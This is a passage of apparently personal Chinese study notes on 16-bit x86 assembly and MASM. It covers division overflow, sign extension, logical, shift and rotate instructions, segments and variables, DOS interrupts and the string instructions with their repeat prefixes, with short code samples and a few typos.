<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax, -19 // 十六进制的-19  0001 1001 =&gt; 1110 0111 =&gt; E 7 </span><br><span class="line">mov bl, 2   // 02</span><br><span class="line">idiv bl	    // E7/2=F4</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/33.png" class title="This is an example image">

<p>被除数远大于除数时，所得的商就有可能超出它所能表达的范围。</p>
<p>idiv除法溢出：－字节除时商不在-128～127范围内，或者在字除时商不在-32768～32767范围内</p>
<p>div除法溢出: 8位除法运算结果大于8位，16位除法运算结果大于16位。</p>
<p>举例: ax&#x3D; FFFF， bl &#x3D; FF， div bl</p>
<p>结果：相当于FFFF／FF&#x3D;101，此时AH显然放不所以商溢出</p>
<img src="/2024/02/22/Notes-Decompile/40.png" class title="This is an example image">

<h4 id="符号扩展指令（CBW-x2F-CWD）"><a href="#符号扩展指令（CBW-x2F-CWD）" class="headerlink" title="符号扩展指令（CBW&#x2F;CWD）"></a>符号扩展指令（CBW&#x2F;CWD）</h4><p>CBW（将字节转换成字指令）：</p>
<p>－语句格式：CBW(convert byte to word)</p>
<p>－功能：将AL中的符号扩展至AH中,操作数是隐含且固定的。把数值最高位扩展</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV AL, 04</span><br><span class="line">CBW</span><br><span class="line">MOV AL, FE</span><br><span class="line">CBW</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/34.png" class title="This is an example image">

<p>CWD（将字转换成双字指令）：</p>
<p>-语句格式：CWD</p>
<p>-功能：将AX中的符号扩展至DX中,操作数是隐含且固定的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV AX, 1234</span><br><span class="line">CWD</span><br><span class="line">MOV AX, FFF7</span><br><span class="line">CWD</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/35.png" class title="This is an example image">

<h4 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h4><h5 id="逻辑与：AND"><a href="#逻辑与：AND" class="headerlink" title="逻辑与：AND"></a>逻辑与：AND</h5><p>－指令的格式：AND Reg&#x2F;Mem, Reg&#x2F;Mem&#x2F;lmm</p>
<p>－受影响的标志位：CF(O)、OF(O)、PF、SF和ZF(AF无定义)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax, 4569  ; 0100 0101 0110 1001</span><br><span class="line">and ax, 1234  ; 0001 0010 0011 0100</span><br><span class="line">mov bx, 4541</span><br><span class="line">and ax, bx</span><br><span class="line">mov word ptr [0], 1111</span><br><span class="line">and ax, [0]</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/36.png" class title="This is an example image">

<h5 id="逻辑或：OR"><a href="#逻辑或：OR" class="headerlink" title="逻辑或：OR"></a>逻辑或：OR</h5><p>－指令的格式：OR Reg&#x2F;Mem, Reg&#x2F;Mem&#x2F;Imm</p>
<p>－受影响的标志位：CF(O)、OF(O)、PF、SF和ZF(AF无定义)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax, 4569  ; 0100 0101 0110 1001</span><br><span class="line">or ax, 1234   ; 0001 0010 0011 0100   </span><br><span class="line">			 ; 0101 0111 0111 1101</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/37.png" class title="This is an example image">

<h5 id="逻辑非：NOT"><a href="#逻辑非：NOT" class="headerlink" title="逻辑非：NOT"></a>逻辑非：NOT</h5><p>－指令的格式：NOT Reg&#x2F;Mem</p>
<p>－受影响的标志位：无</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax, 4569 ; 0100 0101 0110 1001</span><br><span class="line">not ax</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/38.png" class title="This is an example image">

<h5 id="异或：XOR"><a href="#异或：XOR" class="headerlink" title="异或：XOR"></a>异或：XOR</h5><p>－指令的格式：XOR Reg&#x2F;Mem,Reg&#x2F;Mem&#x2F;lmm</p>
<p>－受影响的标志位：CF(O)、OF(O)、PF、SF和ZF(AF无定义)</p>
<p>（相同为0不同为1，用于求两个数是否不同）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax, 4569 ; 0100 0101 0110 1001</span><br><span class="line">mov bx, 1234 ; 0001 0010 0011 0100   </span><br><span class="line">xor ax,bx    ; 0101 0111 0101 1101</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/39.png" class title="This is an example image">

<h5 id="TEST-指令"><a href="#TEST-指令" class="headerlink" title="TEST 指令"></a>TEST 指令</h5><p>格式：TEST Reg&#x2F;Mem,Reg&#x2F;Mem&#x2F;lmm</p>
<p>作用：执行AND，但是不影响目标操作数</p>
<p>受影响的标志位：CF(O)、OF(O)、PF、SF和ZF(AF无定义)。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Eg: test ax, ax</span><br><span class="line">// ax为0，则ZF=0；</span><br><span class="line">// ax不为0，则zF = 1</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>1)如果要将目的操作数中某些位清O，用AND，称之为屏蔽</p>
<p>2)如果要将目的操作数中某些位置1，用OR</p>
<p>3)用来测试目的操作数中某一位或某几位是否为0或1，而目的操作数不变，TEST</p>
<p>4)TEST与CMP的区别，前者是测试一位或几位，后者测试整个字节／字／双字是否相等</p>
<p>5)操作数自身相或、相与结果不变6)xOR AX,Ax 将Ax置0，比mov ax,0 更高效。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax, 4</span><br><span class="line">=&gt;</span><br><span class="line">mox dx, cx</span><br><span class="line">not cx</span><br><span class="line">and dx, cx</span><br><span class="line">mov bx, 4</span><br><span class="line">xor bx, dx</span><br><span class="line">mov ax, bx</span><br></pre></td></tr></table></figure>

<h4 id="逻辑恒等式"><a href="#逻辑恒等式" class="headerlink" title="逻辑恒等式"></a>逻辑恒等式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a and 1 = a</span><br><span class="line">a and 0 = 0</span><br><span class="line">a xor 1 = not a</span><br><span class="line">a xor 0 = a</span><br><span class="line">a xor a = 0</span><br><span class="line">a and not a = 0</span><br></pre></td></tr></table></figure>

<h4 id="无分支求绝对值"><a href="#无分支求绝对值" class="headerlink" title="无分支求绝对值"></a>无分支求绝对值</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax, X</span><br><span class="line">cwd</span><br><span class="line">xor ax, dx</span><br><span class="line">sub ax, dx</span><br></pre></td></tr></table></figure>

<h4 id="无分支求三目运算"><a href="#无分支求三目运算" class="headerlink" title="无分支求三目运算"></a>无分支求三目运算</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、reg == 8 ? 13:7</span><br><span class="line">mov ax, X</span><br><span class="line">sub ax, 8</span><br><span class="line">neg ax</span><br><span class="line">sbb ax, ax ;if X=8, ax=0</span><br><span class="line">		  ;if X!=8, ax=-1</span><br><span class="line">mov dx. -6</span><br><span class="line">and dx, ax</span><br><span class="line">add dx, 13</span><br><span class="line"></span><br><span class="line">2、reg == 4 ? 6:11</span><br><span class="line">mov ax, X</span><br><span class="line">sub ax, 4</span><br><span class="line">neg ax</span><br><span class="line">sbb ax, ax ;if X=4, ax=0</span><br><span class="line">		  ;if X!=4, ax=-1</span><br><span class="line">mov dx. 5</span><br><span class="line">and dx, ax</span><br><span class="line">add dx, 6</span><br></pre></td></tr></table></figure>

<p>反汇编</p>
<p>反编译</p>
<p>汇编不会优化、高级语言会优化</p>
<p>反汇编引擎的基本框架</p>
<p>默认都是ds</p>
<p>bp -&gt; ss</p>
<p>ip -&gt; cs</p>
<p>用winhex从内存寻找到dbox对应的值</p>
<p>DAA&#x2F;DAS、 AAA&#x2F; AAS&#x2F;AAM&#x2F;AAD</p>
<p>特权指令</p>
<p>指令手册，不同系统</p>
<p>808x、286、386、486</p>
<h4 id="移位指令"><a href="#移位指令" class="headerlink" title="移位指令"></a>移位指令</h4><h5 id="逻辑移位-amp-算数移位"><a href="#逻辑移位-amp-算数移位" class="headerlink" title="逻辑移位&amp;算数移位"></a>逻辑移位&amp;算数移位</h5><table>
<thead>
<tr>
<th>指令</th>
<th>名称</th>
<th>格式</th>
<th>意义</th>
<th>影响标志</th>
</tr>
</thead>
<tbody><tr>
<td>SAL(shift arithmetic left)</td>
<td>算数左移</td>
<td>op r&#x2F;m, 1&#x2F;cl</td>
<td>1、左移CNT位<br>2、高位进CF<br>3、低位补0</td>
<td>OF,ZF,SF,PF,CF</td>
</tr>
<tr>
<td>SHL(shift logical left)</td>
<td>逻辑左移</td>
<td>op r&#x2F;m, 1&#x2F;cl</td>
<td>1、左移CNT位<br>2、高位进CF<br>3、低位补0</td>
<td>OF,ZF,SF,PF,CF</td>
</tr>
<tr>
<td>SAR(shift arithmeticright)</td>
<td>算数右移</td>
<td>op r&#x2F;m, 1&#x2F;cl</td>
<td>1、右移CNT位<br>2、高位保持不变(补自己)<br>3、低位进CF</td>
<td>OF,ZF,SF,PF,CF</td>
</tr>
<tr>
<td>SHR(shift logical right)</td>
<td>逻辑右移</td>
<td>op r&#x2F;m, 1&#x2F;cl</td>
<td>1、左移CNT位<br>2、高位补0<br>3、低位进CF</td>
<td>OF,ZF,SF,PF,CF</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV AX, FEFE</span><br><span class="line">SHL AX, 1</span><br><span class="line">MOV CL, 2</span><br><span class="line">SHL AX, CL</span><br><span class="line">MOV WORD PTR [0], 5566</span><br><span class="line">SHL WORD PTR [0], 1</span><br><span class="line">SHL WORD PTR [0], CL</span><br><span class="line">AX, CL</span><br></pre></td></tr></table></figure>

<h5 id="循环移位"><a href="#循环移位" class="headerlink" title="循环移位"></a>循环移位</h5><table>
<thead>
<tr>
<th>指令</th>
<th>名称</th>
<th>格式</th>
<th>意义</th>
<th>影响标志</th>
</tr>
</thead>
<tbody><tr>
<td>ROL(rotate)</td>
<td>循环左移</td>
<td>op r&#x2F;m, 1&#x2F;cl</td>
<td>1、左移<br>2、高位进低位<br>3、高位进CF</td>
<td>OF、CF<br>其他标志无定义</td>
</tr>
<tr>
<td>ROR(rotate)</td>
<td>循环右移</td>
<td>op r&#x2F;m, 1&#x2F;cl</td>
<td>1、右移<br>2、低位进高位<br>3、低位进CF</td>
<td>OF、CF<br>其他标志无定义</td>
</tr>
<tr>
<td>RCL(carry)</td>
<td>带进位循环左移</td>
<td>op r&#x2F;m, 1&#x2F;cl</td>
<td>1、左移<br>2、高位进CF<br>3、CF进低位</td>
<td>OF、CF<br>其他标志无定义</td>
</tr>
<tr>
<td>RCR(carry)</td>
<td>带进位循环右移</td>
<td>op r&#x2F;m, 1&#x2F;cl</td>
<td>1、右移<br>2、高位进CF<br>3、CF进高位</td>
<td>OF、CF<br>其他标志无定义</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax, fefe</span><br><span class="line">rol ax, 1</span><br><span class="line">mov ax, fefe</span><br><span class="line">rol ax, 2</span><br><span class="line">rol ax, cl</span><br></pre></td></tr></table></figure>



<h2 id="ASM基础语法"><a href="#ASM基础语法" class="headerlink" title="ASM基础语法"></a>ASM基础语法</h2><p>配置Masm615</p>
<p>VSCode安装MASM&#x2F;TASM插件</p>
<p>编译命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ml /c xx.asm</span><br><span class="line">link xx.obj</span><br></pre></td></tr></table></figure>

<p>编译+调试 脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ml /c %1.asm</span><br><span class="line">link %1.obj</span><br><span class="line">debug %1.exe</span><br></pre></td></tr></table></figure>



<p>直接用插件，插件的环境是临时的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ml /c test.asm    ；编译生成obj文件</span><br><span class="line">link test.obj     ；链接生成exe文件</span><br><span class="line">debug test.exe</span><br><span class="line"></span><br><span class="line">data_seg segment</span><br><span class="line">    mov ax, ax</span><br><span class="line">    mov ax, ax</span><br><span class="line">ENRTY：</span><br><span class="line">    mov ax, ax</span><br><span class="line">    mov ax, ax</span><br><span class="line">data_seg ends</span><br><span class="line">end ENRTY</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data segment ;数据段</span><br><span class="line">    string db &#x27;zhuge shabi$&#x27;</span><br><span class="line">data ends</span><br><span class="line">code segment ;代码段</span><br><span class="line">assume cs:code,ds:data</span><br><span class="line">start:</span><br><span class="line">    mov ax,data ;获取段基址</span><br><span class="line">    mov ds,ax ;将段基址送入寄存器</span><br><span class="line">    mov dx,offset string</span><br><span class="line">    mov ah,9</span><br><span class="line">    int 21h</span><br><span class="line">    mov ah,4ch</span><br><span class="line">    int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>



<p>debug exe，用前边的-u，-a调试</p>
<p>入口</p>
<h3 id="段"><a href="#段" class="headerlink" title="段"></a>段</h3><ul>
<li>一个程序必须至少有一个段</li>
<li>一个程序中可以定义多个段</li>
<li>段不能嵌套</li>
<li>段可以重名，重名的段会被编译到同一块内存中</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">段名 segment </span><br><span class="line">start:</span><br><span class="line">	xxx</span><br><span class="line">段名 ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<h3 id="数值"><a href="#数值" class="headerlink" title="数值"></a>数值</h3><h4 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h4><ul>
<li>整数可以支持多个进制</li>
<li>数值必须以数字开头，如果非数字前面必须加0</li>
<li>负数前面可以加减号（-)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">十进制 mov ax, 1234 / mov ax, 1234d</span><br><span class="line">二进制 mov ax, 1011b</span><br><span class="line">八进制 mov ax, 76o</span><br><span class="line">十六进制 mov ax, 76h / mov ax, 0abh</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code segment </span><br><span class="line">start:</span><br><span class="line">	mov ax, 256</span><br><span class="line">	mov ax, 256d</span><br><span class="line">	mov ax, 10000000b</span><br><span class="line">	mov cx, 100</span><br><span class="line">	mov dx, 1234h</span><br><span class="line">	mov dx, -1h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/43.png" class title="This is an example image">

<h4 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al, &#x27;a&#x27;</span><br><span class="line">mov bl, &#x27;b&#x27;</span><br><span class="line">mov cl, &#x27;c&#x27;</span><br><span class="line">mov dl, &#x27;d&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><h5 id="整数-1"><a href="#整数-1" class="headerlink" title="整数"></a>整数</h5><ul>
<li>整数可以支持多个类型</li>
<li>整数可以有多个初值，未初始化的值用问号（？）表示</li>
<li>变量一般定义在一个单独的段中</li>
</ul>
<p>格式：变量名 类型  初始值<br>          val        dd     5566h</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;数据段和操作段分开</span><br><span class="line">data_seg segment</span><br><span class="line">	g_btVal db 55h                  ; db 字节</span><br><span class="line">	g_wVal dw 5566h                 ; dw 字</span><br><span class="line">	g_dwVal dd 55667788h            ; dd 双字</span><br><span class="line">	g_qVal dq 1122334455667788h     ; dq 8字节</span><br><span class="line">	g_tVal dt 11223344556677889900h ; dt 10字节</span><br><span class="line">data_seg ends</span><br><span class="line"></span><br><span class="line">uinitdata_seg segment</span><br><span class="line">	g_btVal1 db ?</span><br><span class="line">	g_wVal1 dw ?</span><br><span class="line">	g_tVal dt ?</span><br><span class="line">uinitdata_seg ends</span><br><span class="line"></span><br><span class="line">code_seg segment</span><br><span class="line">START:</span><br><span class="line">	assume ds:data_seg ;ds:ip，此处指定下面g_btVal变量去data_seg找</span><br><span class="line">	mov ax, data_seg ;还需要重新指定ds的值，否则基地址错误</span><br><span class="line">	mov ds, ax</span><br><span class="line">	</span><br><span class="line">	mov al, g_btVal</span><br><span class="line">	mov ax, g_wVal</span><br><span class="line">code_seg ends</span><br><span class="line">end START</span><br></pre></td></tr></table></figure>

<p>-d 查看内存往前偏移 </p>
<p>076D-&gt;0769为什么是偏移两行</p>
<img src="/2024/02/22/Notes-Decompile/44.png" class title="This is an example image">

<p><strong>-u 看基址，-d指定基地址看数据，mov是取地址的值，-u看要mov的值的地址</strong></p>
<h5 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h5><ul>
<li>字符串都可以用单引号()或双引号(“”)</li>
<li>字符串一般以美元符$结尾</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9_sz db &quot;hello world$&quot; ;16位汇编中以美元符结尾</span><br><span class="line">data_seg segment</span><br><span class="line">	g_szHello db &quot;hello world$&quot;                  ; db 字节</span><br><span class="line">data_seg ends</span><br></pre></td></tr></table></figure>

<h5 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data_seg segment</span><br><span class="line">	g_ary db 10h, 11h, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;; db 字节</span><br><span class="line">	g_ary1 db 10 dup(0cch); 重复10个字节，每个字节填充cc</span><br><span class="line">	g_ary2 db 10 dup(?)</span><br><span class="line">	g_ary3 db 45h, 10 dup(46h), 47h, 20 dup(48h)</span><br><span class="line">data_seg ends</span><br></pre></td></tr></table></figure>

<h5 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h5><p>masm提供了很多伪指令，可以获取变量的大小和地址称之为变量的属性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">seg      取段基址</span><br><span class="line">offset   取段偏移</span><br><span class="line">type     取元素类型大小</span><br><span class="line">length   取元素个数</span><br><span class="line">size     取数据大小</span><br><span class="line"></span><br><span class="line">data_seg segment</span><br><span class="line">	g_btVal db 55h                  ; db 字节</span><br><span class="line">	g_wVal dw 5566h                 ; dw 字</span><br><span class="line">	g_dwVal dd 55667788h            ; dd 双字</span><br><span class="line">	g_qVal dq 1122334455667788h     ; dq 8字节</span><br><span class="line">	g_tVal dt 11223344556677889900h ; dt 10字节</span><br><span class="line">data_seg ends</span><br><span class="line"></span><br><span class="line">code_seg segment</span><br><span class="line">START:</span><br><span class="line">	assume ds:data_seg ;ds:ip，此处指定下面g_btVal变量去data_seg找</span><br><span class="line">	mov ax, data_seg ;还需要重新指定ds的值，否则基地址错误</span><br><span class="line">	mov ds, ax</span><br><span class="line">	mov ax, seg g_wVal</span><br><span class="line">	mov ax, offset g_dwVal </span><br><span class="line">code_seg ends</span><br><span class="line">end START</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/45.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/46.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;获取g_ary3的大小</span><br><span class="line">mov ax, offset g_ary4</span><br><span class="line">sub ax, offset g_ary3</span><br></pre></td></tr></table></figure>

<h5 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h5><p>SS:存放栈的段地址；<br>SP:堆栈寄存器SP(stack pointer)存放栈的偏移地址；<br>BP: 基数指针寄存器BP(base pointer)是一个寄存器；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stack_seg segment stack ;栈会自动加载</span><br><span class="line">	db 256 dup(0cch) ;为栈申请大小</span><br><span class="line">stack_seg ends</span><br><span class="line"></span><br><span class="line">push ax</span><br><span class="line">push bx</span><br><span class="line">push cx</span><br><span class="line">push dx</span><br><span class="line">pop ax</span><br><span class="line">pop bx</span><br><span class="line">pop cx</span><br><span class="line">pop dx</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/47.png" class title="This is an example image">

<h5 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h5><ul>
<li>dos系统提供的功能（API），通过<strong>21号中断</strong>来调用</li>
<li>每个功能都有一个编号，通过AH指定功能号</li>
<li>每个功能的参数查看手册</li>
</ul>
<p>INT指令，本指令将产生一个软中断,把控制转向一个类型号为n的软中断,该中断处理程序入口地址在中断向量表的n*4地   —-  址处的二个存储器字(4个单元)中.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">API功能默认调用00:00的函数</span><br><span class="line">-a</span><br><span class="line">; 0000:0000  60 10 00 F0 0B 00 70 00-08 00 70 00 08 00 70 00</span><br><span class="line">INT 00 ;表示调用 F000:1060</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/50.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/48.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code_seg segment</span><br><span class="line">START:</span><br><span class="line">    mov ah, 4ch</span><br><span class="line">    mov al, 00h</span><br><span class="line">    int </span><br><span class="line">code_seg ends</span><br><span class="line">end START ; -g或是.exe直接退出</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/49.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data_seg segment</span><br><span class="line">	g_szHello db &quot;hello world$&quot;                  ; db 字节</span><br><span class="line">data_seg ends</span><br><span class="line"></span><br><span class="line">code_seg segment</span><br><span class="line">START:</span><br><span class="line">	assume ds:data_seg, ss:stack_seg</span><br><span class="line">	mov ax, data_seg</span><br><span class="line">	mov ds, ax</span><br><span class="line">	</span><br><span class="line">	mov ah, 09</span><br><span class="line">	mov dx, offset g_szHello</span><br><span class="line">	int 21h</span><br><span class="line">code_seg ends</span><br><span class="line">end START ;-p参数</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.model small</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">    strs DB &#x27;hello world&#x27;,13,10,&#x27;$&#x27;</span><br><span class="line">.code</span><br><span class="line">start:</span><br><span class="line">    mov ax,@data</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov dx,offset strs</span><br><span class="line">    mov ah,09h</span><br><span class="line">    int 21h</span><br><span class="line">    mov ah,4ch</span><br><span class="line">    int 21h</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/dgwblog/p/11865850.html">https://www.cnblogs.com/dgwblog/p/11865850.html</a></p>
<h3 id="串操作"><a href="#串操作" class="headerlink" title="串操作"></a>串操作</h3><ul>
<li>源操作数使用si，默认段为DS（以此为基址），<strong>可段超越</strong></li>
<li>目的操作数使用di，默认段为ES（以此为基址），不可段超越</li>
</ul>
<table>
<thead>
<tr>
<th>指令</th>
<th>功能</th>
<th>DF &#x3D; 0(UP)</th>
<th>DF &#x3D; 1(DN)</th>
</tr>
</thead>
<tbody><tr>
<td>movsb<br>（串传送）</td>
<td>1、mov string<br>2、将si地址的内容拷贝到di地址<br>3、(di) &lt;- (si)</td>
<td>si &lt;- si + 1<br>di &lt;- di + 1</td>
<td>si &lt;- si - 1<br>di &lt;- di - 1</td>
</tr>
<tr>
<td>movsw</td>
<td>同 movsb</td>
<td>si &lt;- si + 2<br>di &lt;- di + 2</td>
<td>si &lt;- si - 2<br>di &lt;- di - 2</td>
</tr>
<tr>
<td>stosb<br>（串存储）</td>
<td>1、store string<br>2、将al或者ax内存存储到di地址<br>3、(di) &lt;- al或(di) &lt;- ax</td>
<td>di &lt;- di + 1<br></td>
<td>di &lt;- di - 1<br></td>
</tr>
<tr>
<td>stosw</td>
<td>同 stosb</td>
<td>di &lt;- di + 2</td>
<td>di &lt;- di - 2</td>
</tr>
<tr>
<td>lodsb<br>（串读取）</td>
<td>1、load string<br>2、将si地址内容读入al或者ax<br>3、al &lt;- (si) 或 ax &lt;- (si)</td>
<td>si &lt;- si + 1</td>
<td>si &lt;- si -1</td>
</tr>
<tr>
<td>lodsw</td>
<td>同 lodsb</td>
<td>si &lt;- si + 2</td>
<td>si &lt;- si - 2</td>
</tr>
<tr>
<td>cmpsb<br>(串比较)</td>
<td>1、cmp string<br>2、si地址内容减去di地址内容，不存储结果，影响标志位<br>3、(si) - (di)</td>
<td>si &lt;- si + 1<br>di &lt;- di + 1</td>
<td>si &lt;- si - 1<br>di &lt;- di - 1</td>
</tr>
<tr>
<td>cmpsw</td>
<td>同 cmpsb</td>
<td>si &lt;- si + 2<br>di &lt;- di + 2</td>
<td>si &lt;- si - 2<br>di &lt;- di - 2</td>
</tr>
<tr>
<td>scasb<br>(串扫描)</td>
<td>1、scan string<br>2、al或者ax减去di地址内容，不存结果，影响标志位<br>3、al - (di)或ax - (di)  es:di</td>
<td>di &lt;- di + 1</td>
<td>di &lt;- di - 1</td>
</tr>
<tr>
<td>scasw</td>
<td>同 scasb</td>
<td>di &lt;- di + 2</td>
<td>di &lt;- di - 2</td>
</tr>
</tbody></table>
<h4 id="movsb-amp-movsw"><a href="#movsb-amp-movsw" class="headerlink" title="movsb &amp; movsw"></a>movsb &amp; movsw</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data_seg segment</span><br><span class="line">	g_szSrc db &quot;hello world&quot;, &#x27;$&#x27;</span><br><span class="line">	g_szDst db 64 dup(0)</span><br><span class="line">data_seg ends</span><br><span class="line"></span><br><span class="line">code_seg segment</span><br><span class="line">START:</span><br><span class="line">	assume ds:data_seg </span><br><span class="line">	mov ax, data_seg   ; 这三句是固定的基本上，不然会找错值</span><br><span class="line">	mov ds, ax</span><br><span class="line">	</span><br><span class="line">	mov ax, data_seg   ; 这三句是固定的基本上，不然会找错值</span><br><span class="line">	mov es, ax  ; 因为di用的是es</span><br><span class="line">	</span><br><span class="line">	lea si, g_szSrc</span><br><span class="line">	mov di, offset g_szDst ; 相对起始位置</span><br><span class="line">	;std  -g 11</span><br><span class="line">	movsb ;movsw</span><br><span class="line">	movsb</span><br><span class="line">	movsb</span><br><span class="line">	movsb</span><br><span class="line">	movsb</span><br><span class="line">code_seg ends</span><br><span class="line">end START ;-p参数</span><br><span class="line"></span><br><span class="line">;-t</span><br><span class="line">;-d 0 l 20</span><br><span class="line">;-t</span><br><span class="line">;-d es l 20 可以把ds和es分开段写</span><br><span class="line">;movsb si bi默认是加一，根据DF标志位加一减一</span><br><span class="line">;STD DF&lt;-1 自动减</span><br><span class="line">;CLD DF&lt;-0 自动加</span><br></pre></td></tr></table></figure>

<img src="/2024/02/22/Notes-Decompile/52.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/53.png" class title="This is an example image">

<p>0E24:0010 &#x3D; 0E25:0000？？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data_seg segment</span><br><span class="line">	g_szSrc db &quot;hello world&quot;, &#x27;$&#x27;</span><br><span class="line">data_seg ends</span><br><span class="line"></span><br><span class="line">data_seg0 segment</span><br><span class="line">	g_szDst0 db 64 dup(0)</span><br><span class="line">data_seg0 ends</span><br><span class="line"></span><br><span class="line">code_seg segment</span><br><span class="line">START:</span><br><span class="line">	assume ds:data_seg, es:data_seg0</span><br><span class="line">	mov ax, data_seg   ; 这三句是固定的基本上，不然会找错值</span><br><span class="line">	mov ds, ax</span><br><span class="line">	</span><br><span class="line">	mov ax, data_seg0   ; 这三句是固定的基本上，不然会找错值</span><br><span class="line">	mov es, ax  ; 因为di用的是es</span><br><span class="line">	</span><br><span class="line">	lea si, g_szSrc</span><br><span class="line">	mov di, offset g_szDst0 ; 相对起始位置</span><br><span class="line">	;std  -g 11</span><br><span class="line">	movsb ;movsw</span><br><span class="line">	movsb</span><br><span class="line">	movsb</span><br><span class="line">	movsb</span><br><span class="line">	movsb</span><br><span class="line">code_seg ends</span><br><span class="line">end START ;-p参数</span><br></pre></td></tr></table></figure>



<h4 id="stosb-amp-stosw"><a href="#stosb-amp-stosw" class="headerlink" title="stosb &amp; stosw"></a>stosb &amp; stosw</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov di, offset g_szDst</span><br><span class="line">cld</span><br><span class="line">mov ax, 0cccch</span><br><span class="line">stowd</span><br><span class="line">stowd</span><br><span class="line">stowd</span><br><span class="line">stowd</span><br><span class="line">stowd</span><br></pre></td></tr></table></figure>

<p>其他自行看</p>
<p>代码虚拟化、软件模拟硬件</p>
<h4 id="重复前缀"><a href="#重复前缀" class="headerlink" title="重复前缀"></a>重复前缀</h4><p>串操作指令一般都配合重复前缀使用，实现内存的批量操作，</p>
<table>
<thead>
<tr>
<th>前缀</th>
<th>串操作</th>
<th>重复条件</th>
</tr>
</thead>
<tbody><tr>
<td>rep</td>
<td>1、movs<br>2、stos<br>3、loads</td>
<td>cx !&#x3D; 0</td>
</tr>
<tr>
<td>repz &#x2F; repe</td>
<td>1、cmps<br>2、scas</td>
<td>cx !&#x3D; 0<br>且<br><br>zf &#x3D; 1</td>
</tr>
<tr>
<td>repnz &#x2F; repne</td>
<td>1、cmps<br>2、scas</td>
<td></td>
</tr>
</tbody></table>
